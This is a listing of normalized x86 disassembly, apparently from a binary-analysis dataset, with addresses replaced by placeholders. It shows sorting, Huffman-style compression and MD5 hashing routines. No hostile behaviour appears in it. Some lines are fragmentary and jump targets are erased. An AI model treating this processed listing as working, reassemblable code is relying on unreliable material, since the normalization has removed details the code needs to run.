mov esi rw-data
mov ebx [ rw-data ]
dec ebx
mov [ rw-data ] ebx
mov eax ebx
dec eax
mov edx [ esi + eax * 4 ]
add edx [ esi + ebx * 4 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x4 ]
add ecx 0x3
mov [ ebp - 0x4 ] ecx
mov esi rw-data
mov edi rw-data
mov edx [ ebp - 0x8 ]
mov [ edi + ecx * 4 ] edx
mov edx [ esi + eax * 4 ]
mov [ edi + ecx * 4 + 0x4 ] edx
mov edx [ esi + ebx * 4 ]
mov [ edi + ecx * 4 + 0x8 ] edx
mov esi rw-data
mov edx [ ebp - 0xc ]
mov [ esi + eax * 4 ] edx
mov esi rw-data
mov edx [ ebp - 0x8 ]
mov [ esi + eax * 4 ] edx
inc [ ebp - 0x8 ]
mov eax [ rw-data ]
cmp eax 0x1
jg r-xdata
pop edi
pop esi
pop ebx
sub_407820
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi eax
inc eax
cmp [ esi + edi * 4 ] edx
ja r-xdata
mov eax edi
mov edi ebx
dec ebx
cmp [ esi + edi * 4 ] edx
jb r-xdata
mov ebx edi
cmp eax ebx
jg r-xdata
mov [ ebp - 0x4 ] ebx
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov ecx [ esi + eax * 4 ]
mov edi [ esi + ebx * 4 ]
mov [ esi + eax * 4 ] edi
mov [ esi + ebx * 4 ] ecx
mov esi [ ebp + 0xc ]
mov ecx [ esi + eax * 4 ]
mov edi [ esi + ebx * 4 ]
mov [ esi + eax * 4 ] edi
mov [ esi + ebx * 4 ] ecx
inc eax
dec ebx
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0x10 ]
cmp ecx eax
jge r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ ebp + 0x14 ]
cmp eax ecx
jge r-xdata
push eax
mov eax [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push eax
push ecx
call sub_407820
add esp 0x10
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
mov ecx eax
add ecx ebx
shr ecx 0x1
mov edx [ esi + ecx * 4 ]
sub_4078c0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
mov [ rw-data ] 0x0
mov ecx 0x0
mov edx [ rw-data ]
mov esi rw-data
mov edi rw-data
mov [ ebp - 0x8 ] 0x0
mov eax [ rw-data ]
mov ebx [ edi + edx * 4 ]
add edx eax
mov ebx [ edi + edx * 4 ]
sub edx eax
add ecx ecx
cmp eax 0x2
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ edi + edx * 4 + 0x4 ]
je r-xdata
inc [ ebp - 0x8 ]
cmp ebx 0x100
jle r-xdata
or ecx 0x1
dec [ ebp - 0x8 ]
shr ecx 0x1
jmp r-xdata
cmp ebx [ edi + edx * 4 + 0x8 ]
jne r-xdata
push edx
mov eax rw-data
mov edx [ ebp - 0x8 ]
mov [ eax + ebx * 4 + 0x400 ] edx
mov [ eax + ebx * 4 ] ecx
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] ecx
mov ebx [ rw-data ]
mov eax rw-data
mov [ eax + ebx * 4 ] ecx
pop ecx
mov eax rw-data
mov [ eax + ebx * 4 ] ecx
inc ebx
mov [ rw-data ] ebx
mov ebx [ ebp - 0x4 ]
pop edx
dec [ ebp - 0x8 ]
shr ecx 0x1
jmp r-xdata
sub edx 0x3
cmp ebx [ edi + edx * 4 ]
jne r-xdata
mov eax 0x0
mov al [ esi + edx ]
dec [ esi + edx ]
cmp eax 0x0
je r-xdata
add edx 0x3
cmp edx eax
jg r-xdata
jmp r-xdata
sub_4079a0
push ebp
mov ebp esp
push esi
push edi
call sub_4076a0
mov esi [ ebp + 0x8 ]
mov edi rw-data
mov ecx [ ebp + 0xc ]
mov eax 0x0
lodsb [ esi ]
inc [ edi + eax * 4 ]
dec ecx
jne r-xdata
call sub_4076e0
call sub_407760
mov edx 0x0
mov dx [ rw-data ]
shl edx 0x2
mov [ ebp + 0xc ] edx
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
push eax
push rw-data
push ecx
call sub_40c9f0
call sub_4078c0
mov edx [ ebp + 0x14 ]
push 0x800
push rw-data
push edx
call sub_40c9f0
mov ax [ rw-data ]
add esp 0x18
pop edi
pop esi
pop ebp
retn
sub_407a20
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] 0x0
mov eax 0x0
mov ax [ ebp + 0x10 ]
shl eax 0x2
mov [ rw-data ] eax
add eax 0x6
mov [ ebp - 0x8 ] eax
mov esi [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
mov edi 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub edi 0x20
sub ecx edi
mov [ ebp - 0x4 ] 0x1
dec [ ebp - 0xc ]
jne r-xdata
add [ ebp - 0x8 ] 0x4
mov eax 0x20
sub eax edi
mov ecx eax
mov [ ebp - 0x4 ] 0x0
mov eax 0x0
lodsb [ esi ]
mov ebx [ edx + eax * 4 ]
mov ecx [ edx + eax * 4 + 0x400 ]
add edi ecx
cmp edi 0x20
jle r-xdata
cmp edi 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x20
sub eax edi
mov ecx eax
add [ ebp - 0x8 ] 0x4
sub_407ac0
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x1c ]
push ebx
mov [ ebp - 0x14 ] eax
xor eax eax
push esi
push edi
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov eax 0x0
mov ax [ ebp + 0x10 ]
mov [ rw-data ] ax
shl eax 0x2
mov [ rw-data ] eax
mov edi [ ebp + 0x1c ]
mov eax [ ebp + 0xc ]
mov [ edi ] eax
add edi 0x4
mov ecx 0x0
mov cx [ rw-data ]
mov [ edi ] cx
add edi 0x2
mov edx [ rw-data ]
mov [ ebp - 0x4 ] edx
add [ ebp - 0x4 ] 0x6
shr edx 0x1
add edi edx
mov [ ebp + 0x1c ] edi
mov edx [ ebp + 0xc ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp + 0x18 ]
mov edi 0x0
xor esi esi
shl esi cl
or esi ebx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
sub edi 0x20
sub ecx edi
mov [ ebp - 0xc ] ebx
push ecx
mov ecx edi
shr ebx cl
pop ecx
mov [ ebp - 0x8 ] 0x1
dec [ ebp - 0x10 ]
jne r-xdata
mov eax esi
push edi
mov edi [ ebp + 0x1c ]
mov [ edi ] eax
pop edi
add [ ebp + 0x1c ] 0x4
add [ ebp - 0x4 ] 0x4
mov eax 0x20
sub eax edi
mov ecx eax
mov eax [ ebp - 0xc ]
shl eax cl
shr eax cl
mov esi eax
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x8 ] 0x0
mov eax 0x0
push esi
mov esi [ ebp + 0x8 ]
mov al [ esi ]
inc esi
mov [ ebp + 0x8 ] esi
pop esi
mov ebx [ edx + eax * 4 ]
mov ecx [ edx + eax * 4 + 0x400 ]
add edi ecx
cmp edi 0x20
jle r-xdata
cmp edi 0x0
je r-xdata
mov edx [ rw-data ]
mov eax [ ebp + 0x14 ]
mov ecx [ ebp - 0x14 ]
shr edx 0x2
push edx
push eax
push rw-data
lea esi [ ecx + 0x6 ]
call sub_407c10
mov ecx [ rw-data ]
shr ecx 0x1
push ecx
push rw-data
push esi
call sub_40c9f0
mov eax [ ebp - 0x4 ]
add esp 0x18
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0x20
sub eax edi
mov ecx eax
shl esi cl
mov eax esi
mov edi [ ebp + 0x1c ]
mov [ edi ] eax
add [ ebp - 0x4 ] 0x4
sub_407c10
push ebp
mov ebp esp
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov eax [ esi ]
mov [ edi ] ax
add esi 0x4
add edi 0x2
dec ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_407c30
mov edx ecx
push esi
push edi
mov ecx 0x10
lea esi [ edx + 0x4 ]
xor eax eax
mov edi esi
mov [ edx ] r--data
[ edi ]
mov [ esi ] 0x80
pop edi
mov eax edx
pop esi
retn
sub_407cb0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
mov ebp ecx
push edi
mov ecx [ esi + 0x10 ]
mov edi [ esp + 0x1c ]
mov eax ecx
shr eax 0x3
lea ecx [ ecx + edi * 8 ]
lea edx [ edi * 8 ]
and eax 0x3f
cmp ecx edx
mov [ esi + 0x10 ] ecx
jae r-xdata
mov ebx [ esi + 0x14 ]
mov ecx edi
shr ecx 0x1d
add ebx ecx
mov [ esi + 0x14 ] ebx
mov ebx 0x40
sub ebx eax
cmp edi ebx
jb r-xdata
inc [ esi + 0x14 ]
mov [ esp + 0x14 ] 0x0
mov edx [ esp + 0x18 ]
push ebx
lea eax [ eax + esi + 0x18 ]
push edx
push eax
mov ecx ebp
call sub_4087e0
lea ecx [ esi + 0x18 ]
push ecx
push esi
mov ecx ebp
call sub_407df0
mov [ esp + 0x14 ] ebx
add ebx 0x3f
cmp ebx edi
jae r-xdata
xor eax eax
jmp r-xdata
mov edx [ esp + 0x18 ]
mov ecx ebp
lea eax [ edx + ebx - 0x3f ]
push eax
push esi
call sub_407df0
mov edx [ esp + 0x14 ]
add ebx 0x40
add edx 0x40
cmp ebx edi
mov [ esp + 0x14 ] edx
jb r-xdata
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x18 ]
sub edi ecx
add ecx edx
push edi
lea eax [ eax + esi + 0x18 ]
push ecx
push eax
mov ecx ebp
call sub_4087e0
pop edi
pop esi
pop ebp
pop ebx
retn 0xc
sub_407d70
sub esp 0x8
lea eax [ esp ]
push ebx
push esi
push edi
mov edi [ esp + 0x1c ]
push 0x8
mov esi ecx
lea ebx [ edi + 0x10 ]
push ebx
push eax
call sub_408740
mov eax [ ebx ]
mov ecx 0x38
shr eax 0x3
and eax 0x3f
cmp eax 0x38
jb r-xdata
sub ecx eax
push ecx
lea ecx [ esi + 0x4 ]
push ecx
push edi
mov ecx esi
call sub_407cb0
lea edx [ esp + 0xc ]
push 0x8
push edx
push edi
mov ecx esi
call sub_407cb0
mov eax [ esp + 0x18 ]
push 0x10
push edi
push eax
mov ecx esi
call sub_408740
push 0x58
push 0x0
push edi
mov ecx esi
call sub_408800
pop edi
pop esi
pop ebx
add esp 0x8
retn 0x8
mov ecx 0x78
sub_407df0
sub esp 0x44
push ebx
mov edx [ esp + 0x50 ]
push ebp
push esi
mov esi [ esp + 0x54 ]
push edi
push 0x40
push edx
mov eax [ esi ]
mov edi [ esi + 0x4 ]
mov ebx [ esi + 0x8 ]
mov ebp [ esi + 0xc ]
mov [ esp + 0x60 ] eax
lea eax [ esp + 0x1c ]
push eax
mov [ esp + 0x1c ] ecx
call sub_408790
mov eax [ esp + 0x14 ]
mov ecx edi
not ecx
mov edx ebx
and ecx ebp
and edx edi
or ecx edx
mov edx edi
add ecx eax
mov eax [ esp + 0x58 ]
lea ecx [ eax + ecx - 0x28955b88 ]
mov eax ecx
shr eax 0x19
shl ecx 0x7
or eax ecx
add eax edi
mov ecx eax
and edx eax
not ecx
and ecx ebx
or ecx edx
mov edx [ esp + 0x18 ]
add ecx edx
lea edx [ ecx + ebp - 0x173848aa ]
mov ecx edx
shr ecx 0x14
shl edx 0xc
or ecx edx
add ecx eax
mov edx ecx
mov ebp ecx
not edx
and edx edi
and ebp eax
or edx ebp
mov ebp [ esp + 0x1c ]
add edx ebp
mov ebp ecx
lea ebx [ ebx + edx + 0x242070db ]
mov edx ebx
shr edx 0xf
shl ebx 0x11
or edx ebx
add edx ecx
mov ebx edx
and ebp edx
not ebx
and ebx eax
or ebx ebp
mov ebp [ esp + 0x20 ]
add ebx ebp
lea ebx [ edi + ebx - 0x3e423112 ]
mov edi ebx
shl edi 0x16
shr ebx 0xa
or edi ebx
mov ebx edx
add edi edx
mov [ esp + 0x58 ] edi
mov ebp [ esp + 0x58 ]
not edi
and edi ecx
and ebx ebp
or edi ebx
mov ebp [ esp + 0x24 ]
mov ebx [ esp + 0x58 ]
add edi ebp
mov ebp ebx
lea eax [ eax + edi - 0xa83f051 ]
mov edi eax
shr edi 0x19
shl eax 0x7
or edi eax
add edi ebx
mov eax edi
and ebp edi
not eax
and eax edx
or eax ebp
mov ebp [ esp + 0x28 ]
add eax ebp
lea ecx [ ecx + eax + 0x4787c62a ]
mov eax ecx
shr eax 0x14
shl ecx 0xc
or eax ecx
add eax edi
mov ecx eax
mov ebp eax
not ecx
and ecx ebx
and ebp edi
or ecx ebp
mov ebp [ esp + 0x2c ]
add ecx ebp
mov ebp eax
lea edx [ edx + ecx - 0x57cfb9ed ]
mov ecx edx
shr ecx 0xf
shl edx 0x11
or ecx edx
add ecx eax
mov edx ecx
and ebp ecx
not edx
and edx edi
or edx ebp
mov ebp [ esp + 0x30 ]
add edx ebp
lea ebx [ ebx + edx - 0x2b96aff ]
mov edx ebx
shl edx 0x16
shr ebx 0xa
or edx ebx
mov ebx ecx
add edx ecx
mov [ esp + 0x58 ] edx
mov ebp [ esp + 0x58 ]
not edx
and edx eax
and ebx ebp
mov ebp [ esp + 0x34 ]
or edx ebx
add edx ebp
mov ebx [ esp + 0x58 ]
mov ebp ebx
lea edi [ edi + edx + 0x698098d8 ]
mov edx edi
shr edx 0x19
shl edi 0x7
or edx edi
add edx ebx
mov edi edx
and ebp edx
not edi
and edi ecx
or edi ebp
mov ebp [ esp + 0x38 ]
add edi ebp
lea eax [ eax + edi - 0x74bb0851 ]
mov edi eax
shr edi 0x14
shl eax 0xc
or edi eax
add edi edx
mov eax edi
mov ebp edi
not eax
and eax ebx
and ebp edx
or eax ebp
mov ebp [ esp + 0x3c ]
add eax ebp
mov ebp edi
lea ecx [ ecx + eax - 0xa44f ]
mov eax ecx
shr eax 0xf
shl ecx 0x11
or eax ecx
add eax edi
mov ecx eax
and ebp eax
not ecx
and ecx edx
or ecx ebp
mov ebp [ esp + 0x40 ]
add ecx ebp
lea ebx [ ebx + ecx - 0x76a32842 ]
mov ecx ebx
shl ecx 0x16
shr ebx 0xa
or ecx ebx
mov ebx eax
add ecx eax
mov [ esp + 0x58 ] ecx
mov ebp [ esp + 0x58 ]
not ecx
and ecx edi
and ebx ebp
mov ebp [ esp + 0x44 ]
or ecx ebx
add ecx ebp
mov ebx [ esp + 0x58 ]
mov ebp ebx
lea edx [ edx + ecx + 0x6b901122 ]
mov ecx edx
shr ecx 0x19
shl edx 0x7
or ecx edx
add ecx ebx
mov edx ecx
and ebp ecx
not edx
and edx eax
or edx ebp
mov ebp [ esp + 0x48 ]
add edx ebp
lea edi [ edi + edx - 0x2678e6d ]
mov edx edi
shr edx 0x14
shl edi 0xc
or edx edi
add edx ecx
mov ebp edx
mov edi edx
not ebp
and edi ecx
and ebx ebp
or edi ebx
mov ebx [ esp + 0x4c ]
add edi ebx
mov ebx edx
lea eax [ eax + edi - 0x5986bc72 ]
mov edi eax
shr edi 0xf
shl eax 0x11
or edi eax
add edi edx
mov eax edi
and ebx edi
not eax
mov [ esp + 0x5c ] eax
and eax ecx
or eax ebx
mov ebx [ esp + 0x50 ]
add eax ebx
mov ebx [ esp + 0x58 ]
lea ebx [ ebx + eax + 0x49b40821 ]
mov eax ebx
shl eax 0x16
shr ebx 0xa
or eax ebx
mov ebx edx
add eax edi
mov [ esp + 0x58 ] eax
and ebx eax
mov eax edi
and eax ebp
mov ebp [ esp + 0x18 ]
or ebx eax
add ebx ebp
mov ebp edi
lea ecx [ ecx + ebx - 0x9e1da9e ]
mov ebx [ esp + 0x58 ]
mov eax ecx
shr eax 0x1b
shl ecx 0x5
or eax ecx
mov ecx [ esp + 0x5c ]
add eax ebx
and ecx ebx
and ebp eax
or ecx ebp
mov ebp [ esp + 0x2c ]
add ecx ebp
mov ebp [ esp + 0x58 ]
not ebx
lea edx [ edx + ecx - 0x3fbf4cc0 ]
and ebx eax
mov ecx edx
shr ecx 0x17
shl edx 0x9
or ecx edx
add ecx eax
mov edx ecx
and edx ebp
mov ebp [ esp + 0x40 ]
or ebx edx
add ebx ebp
lea edi [ edi + ebx + 0x265e5a51 ]
mov edx edi
shr edx 0x12
shl edi 0xe
or edx edi
mov edi eax
add edx ecx
not edi
mov ebx edx
and edi ecx
and ebx eax
or edi ebx
mov ebx [ esp + 0x14 ]
add edi ebx
mov ebx [ esp + 0x58 ]
lea ebx [ ebx + edi - 0x16493856 ]
mov edi ebx
shl edi 0x14
shr ebx 0xc
or edi ebx
mov ebx ecx
add edi edx
mov [ esp + 0x58 ] edi
mov edi ecx
mov ebp [ esp + 0x58 ]
not edi
and edi edx
and ebx ebp
mov ebp [ esp + 0x28 ]
or edi ebx
add edi ebp
mov ebx [ esp + 0x58 ]
lea eax [ eax + edi - 0x29d0efa3 ]
mov edi eax
shr edi 0x1b
shl eax 0x5
or edi eax
add edi ebx
mov eax edx
mov ebp edx
not eax
and eax ebx
and ebp edi
or eax ebp
mov ebp [ esp + 0x3c ]
add eax ebp
mov ebp [ esp + 0x58 ]
not ebx
lea ecx [ ecx + eax + 0x2441453 ]
and ebx edi
mov eax ecx
shr eax 0x17
shl ecx 0x9
or eax ecx
add eax edi
mov ecx eax
and ecx ebp
mov ebp [ esp + 0x50 ]
or ebx ecx
add ebx ebp
lea edx [ edx + ebx - 0x275e197f ]
mov ecx edx
shr ecx 0x12
shl edx 0xe
or ecx edx
mov edx edi
add ecx eax
not edx
mov ebx ecx
and edx eax
and ebx edi
or edx ebx
mov ebx [ esp + 0x24 ]
add edx ebx
mov ebx [ esp + 0x58 ]
lea ebx [ ebx + edx - 0x182c0438 ]
mov edx ebx
shl edx 0x14
shr ebx 0xc
or edx ebx
mov ebx eax
add edx ecx
mov [ esp + 0x58 ] edx
mov edx eax
mov ebp [ esp + 0x58 ]
not edx
and edx ecx
and ebx ebp
mov ebp [ esp + 0x38 ]
or edx ebx
add edx ebp
mov ebx [ esp + 0x58 ]
mov ebp ecx
lea edi [ edi + edx + 0x21e1cde6 ]
mov edx edi
shr edx 0x1b
shl edi 0x5
or edx edi
mov edi ecx
add edx ebx
not edi
and edi ebx
and ebp edx
or edi ebp
mov ebp [ esp + 0x4c ]
add edi ebp
mov ebp [ esp + 0x58 ]
not ebx
lea eax [ eax + edi - 0x3cc8f82a ]
and ebx edx
mov edi eax
shr edi 0x17
shl eax 0x9
or edi eax
add edi edx
mov eax edi
and eax ebp
mov ebp [ esp + 0x20 ]
or ebx eax
add ebx ebp
lea ecx [ ecx + ebx - 0xb2af279 ]
mov eax ecx
shr eax 0x12
shl ecx 0xe
or eax ecx
mov ecx edx
add eax edi
not ecx
mov ebx eax
and ecx edi
and ebx edx
or ecx ebx
mov ebx [ esp + 0x34 ]
add ecx ebx
mov ebx [ esp + 0x58 ]
lea ebx [ ebx + ecx + 0x455a14ed ]
mov ecx ebx
shl ecx 0x14
shr ebx 0xc
or ecx ebx
mov ebx edi
add ecx eax
mov [ esp + 0x58 ] ecx
mov ecx edi
mov ebp [ esp + 0x58 ]
not ecx
and ecx eax
and ebx ebp
mov ebp [ esp + 0x48 ]
or ecx ebx
add ecx ebp
mov ebx [ esp + 0x58 ]
mov ebp eax
lea edx [ edx + ecx - 0x561c16fb ]
mov ecx edx
shr ecx 0x1b
shl edx 0x5
or ecx edx
mov edx eax
add ecx ebx
not edx
and edx ebx
and ebp ecx
or edx ebp
mov ebp [ esp + 0x1c ]
add edx ebp
mov ebp [ esp + 0x58 ]
not ebx
lea edi [ edi + edx - 0x3105c08 ]
and ebx ecx
mov edx edi
shr edx 0x17
shl edi 0x9
or edx edi
add edx ecx
mov edi edx
and edi ebp
mov ebp [ esp + 0x30 ]
or ebx edi
add ebx ebp
lea eax [ eax + ebx + 0x676f02d9 ]
mov edi eax
shr edi 0x12
shl eax 0xe
or edi eax
mov eax ecx
add edi edx
not eax
mov ebx edi
and eax edx
and ebx ecx
or eax ebx
mov ebx [ esp + 0x44 ]
add eax ebx
mov ebx [ esp + 0x58 ]
lea ebx [ ebx + eax - 0x72d5b376 ]
mov eax ebx
shl eax 0x14
shr ebx 0xc
or eax ebx
mov ebp [ esp + 0x28 ]
mov ebx edx
add eax edi
xor ebx edi
xor ebx eax
add ebx ebp
mov ebp [ esp + 0x34 ]
lea ecx [ ecx + ebx - 0x5c6be ]
mov ebx ecx
shr ebx 0x1c
shl ecx 0x4
or ebx ecx
mov ecx edi
add ebx eax
xor ecx eax
xor ecx ebx
add ecx ebp
mov ebp [ esp + 0x40 ]
lea ecx [ edx + ecx - 0x788e097f ]
mov edx ecx
shr edx 0x15
shl ecx 0xb
or edx ecx
add edx ebx
mov ecx edx
xor ecx eax
xor ecx ebx
add ecx ebp
mov ebp [ esp + 0x4c ]
lea ecx [ edi + ecx + 0x6d9d6122 ]
mov edi ecx
shr edi 0x10
shl ecx 0x10
or edi ecx
mov ecx edx
add edi edx
xor ecx edi
mov [ esp + 0x58 ] ecx
xor ecx ebx
add ecx ebp
mov ebp [ esp + 0x18 ]
lea eax [ eax + ecx - 0x21ac7f4 ]
mov ecx eax
shl ecx 0x17
shr eax 0x9
or ecx eax
mov eax [ esp + 0x58 ]
add ecx edi
xor eax ecx
add eax ebp
mov ebp [ esp + 0x24 ]
lea ebx [ ebx + eax - 0x5b4115bc ]
mov eax ebx
shr eax 0x1c
shl ebx 0x4
or eax ebx
mov ebx edi
add eax ecx
xor ebx ecx
xor ebx eax
add ebx ebp
mov ebp [ esp + 0x30 ]
lea edx [ edx + ebx + 0x4bdecfa9 ]
mov ebx edx
shr ebx 0x15
shl edx 0xb
or ebx edx
add ebx eax
mov edx ebx
xor edx ecx
xor edx eax
add edx ebp
lea edi [ edi + edx - 0x944b4a0 ]
mov edx edi
shr edx 0x10
shl edi 0x10
or edx edi
mov edi ebx
add edx ebx
xor edi edx
mov ebp edi
xor ebp eax
add ebp [ esp + 0x3c ]
lea ebp [ ecx + ebp - 0x41404390 ]
mov ecx ebp
shl ecx 0x17
shr ebp 0x9
or ecx ebp
mov ebp [ esp + 0x48 ]
add ecx edx
xor edi ecx
add edi ebp
mov ebp [ esp + 0x14 ]
lea edi [ eax + edi + 0x289b7ec6 ]
mov eax edi
shr eax 0x1c
shl edi 0x4
or eax edi
mov edi edx
add eax ecx
xor edi ecx
xor edi eax
add edi ebp
mov ebp [ esp + 0x20 ]
lea ebx [ ebx + edi - 0x155ed806 ]
mov edi ebx
shr edi 0x15
shl ebx 0xb
or edi ebx
add edi eax
mov ebx edi
xor ebx ecx
xor ebx eax
add ebx ebp
lea edx [ edx + ebx - 0x2b10cf7b ]
mov ebx edx
shr ebx 0x10
shl edx 0x10
or ebx edx
mov edx edi
add ebx edi
xor edx ebx
mov ebp edx
xor ebp eax
add ebp [ esp + 0x2c ]
lea ebp [ ecx + ebp + 0x4881d05 ]
mov ecx ebp
shl ecx 0x17
shr ebp 0x9
or ecx ebp
mov ebp [ esp + 0x38 ]
add ecx ebx
xor edx ecx
add edx ebp
lea edx [ eax + edx - 0x262b2fc7 ]
mov eax edx
shr eax 0x1c
shl edx 0x4
or eax edx
mov edx ebx
add eax ecx
xor edx ecx
xor edx eax
add edx [ esp + 0x44 ]
lea edi [ edi + edx - 0x1924661b ]
mov edx edi
shr edx 0x15
shl edi 0xb
or edx edi
add edx eax
mov edi edx
xor edi ecx
xor edi eax
add edi [ esp + 0x50 ]
lea ebx [ ebx + edi + 0x1fa27cf8 ]
mov edi ebx
shr edi 0x10
shl ebx 0x10
or edi ebx
mov ebx edx
add edi edx
xor ebx edi
xor ebx eax
add ebx [ esp + 0x1c ]
lea ecx [ ecx + ebx - 0x3b53a99b ]
mov ebx ecx
shl ebx 0x17
shr ecx 0x9
or ebx ecx
mov ecx edx
add ebx edi
not ecx
or ecx ebx
xor ecx edi
add ecx [ esp + 0x14 ]
lea eax [ eax + ecx - 0xbd6ddbc ]
mov ecx eax
shr ecx 0x1a
shl eax 0x6
or ecx eax
mov eax edi
add ecx ebx
not eax
or eax ecx
xor eax ebx
add eax [ esp + 0x30 ]
lea edx [ edx + eax + 0x432aff97 ]
mov eax edx
shr eax 0x16
shl edx 0xa
or eax edx
mov edx ebx
add eax ecx
not edx
or edx eax
xor edx ecx
add edx [ esp + 0x4c ]
lea edi [ edi + edx - 0x546bdc59 ]
mov edx edi
shr edx 0x11
shl edi 0xf
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi [ esp + 0x28 ]
lea ebx [ ebx + edi - 0x36c5fc7 ]
mov edi ebx
shl edi 0x15
shr ebx 0xb
or edi ebx
mov ebx eax
add edi edx
not ebx
or ebx edi
xor ebx edx
add ebx [ esp + 0x44 ]
lea ecx [ ecx + ebx + 0x655b59c3 ]
mov ebx ecx
shr ebx 0x1a
shl ecx 0x6
or ebx ecx
mov ecx edx
add ebx edi
not ecx
or ecx ebx
xor ecx edi
add ecx [ esp + 0x20 ]
lea eax [ eax + ecx - 0x70f3336e ]
mov ecx eax
shr ecx 0x16
shl eax 0xa
or ecx eax
mov eax edi
add ecx ebx
not eax
or eax ecx
xor eax ebx
add eax [ esp + 0x3c ]
lea edx [ edx + eax - 0x100b83 ]
mov eax edx
shr eax 0x11
shl edx 0xf
or eax edx
mov edx ebx
add eax ecx
not edx
or edx eax
xor edx ecx
add edx [ esp + 0x18 ]
lea edi [ edi + edx - 0x7a7ba22f ]
mov edx edi
shl edx 0x15
shr edi 0xb
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi [ esp + 0x34 ]
lea ebx [ ebx + edi + 0x6fa87e4f ]
mov edi ebx
shr edi 0x1a
shl ebx 0x6
or edi ebx
mov ebx eax
add edi edx
not ebx
or ebx edi
xor ebx edx
add ebx [ esp + 0x50 ]
lea ecx [ ecx + ebx - 0x1d31920 ]
mov ebx ecx
shr ebx 0x16
shl ecx 0xa
or ebx ecx
mov ecx edx
add ebx edi
not ecx
or ecx ebx
xor ecx edi
add ecx [ esp + 0x2c ]
lea eax [ eax + ecx - 0x5cfebcec ]
mov ecx eax
shr ecx 0x11
shl eax 0xf
or ecx eax
mov eax edi
add ecx ebx
not eax
or eax ecx
xor eax ebx
add eax [ esp + 0x48 ]
lea edx [ edx + eax + 0x4e0811a1 ]
mov eax edx
shl eax 0x15
shr edx 0xb
or eax edx
mov edx ebx
add eax ecx
not edx
or edx eax
xor edx ecx
add edx [ esp + 0x24 ]
lea edi [ edi + edx - 0x8ac817e ]
mov edx edi
shr edx 0x1a
shl edi 0x6
or edx edi
mov edi ecx
add edx eax
not edi
or edi edx
xor edi eax
add edi [ esp + 0x40 ]
lea ebx [ ebx + edi - 0x42c50dcb ]
mov edi ebx
shr edi 0x16
shl ebx 0xa
or edi ebx
add edi edx
mov ebx eax
push 0x40
not ebx
or ebx edi
push 0x0
xor ebx edx
add ebx [ esp + 0x24 ]
lea ecx [ ecx + ebx + 0x2ad7d2bb ]
mov ebx ecx
shr ebx 0x11
shl ecx 0xf
or ebx ecx
mov ecx edx
add ebx edi
not ecx
or ecx ebx
xor ecx edi
add ecx ebp
mov ebp [ esi + 0x8 ]
add ebp ebx
lea eax [ eax + ecx - 0x14792c6f ]
mov ecx [ esi ]
add ecx edx
mov edx eax
shl edx 0x15
shr eax 0xb
or edx eax
mov eax [ esi + 0x4 ]
add edx ebx
mov ebx [ esi + 0xc ]
add eax edx
mov [ esi ] ecx
mov ecx [ esp + 0x18 ]
mov [ esi + 0x4 ] eax
lea eax [ esp + 0x1c ]
add ebx edi
push eax
mov [ esi + 0x8 ] ebp
mov [ esi + 0xc ] ebx
call sub_408800
pop edi
pop esi
pop ebp
pop ebx
add esp 0x44
retn 0x8
sub_408740
push edi
mov edi [ esp + 0x10 ]
test edi edi
jbe r-xdata
pop edi
retn 0xc
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
push esi
or esi 0xffffffff
lea eax [ edx + 0x1 ]
sub esi edx
mov dl [ ecx ]
add ecx 0x4
mov [ eax - 0x1 ] dl
mov edx [ ecx - 0x4 ]
shr edx 0x8
mov [ eax ] dl
mov edx [ ecx - 0x4 ]
shr edx 0x10
mov [ eax + 0x1 ] dl
mov edx [ ecx - 0x4 ]
shr edx 0x18
mov [ eax + 0x2 ] dl
add eax 0x4
lea edx [ esi + eax ]
cmp edx edi
jb r-xdata
pop esi
sub_408790
push ebp
mov ebp [ esp + 0x10 ]
test ebp ebp
jbe r-xdata
pop ebp
retn 0xc
mov ecx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
push edi
mov edi 0xfffffffe
lea eax [ ecx + 0x2 ]
sub edi ecx
xor ecx ecx
xor edx edx
mov ch [ eax + 0x1 ]
mov dl [ eax - 0x1 ]
mov cl [ eax ]
add eax 0x4
shl ecx 0x8
or ecx edx
xor edx edx
mov dl [ eax - 0x6 ]
add esi 0x4
shl ecx 0x8
or ecx edx
mov [ esi - 0x4 ] ecx
lea ecx [ edi + eax ]
cmp ecx ebp
jb r-xdata
pop edi
pop esi
sub_4087e0
push esi
mov esi [ esp + 0x10 ]
test esi esi
jbe r-xdata
pop esi
retn 0xc
mov eax [ esp + 0x8 ]
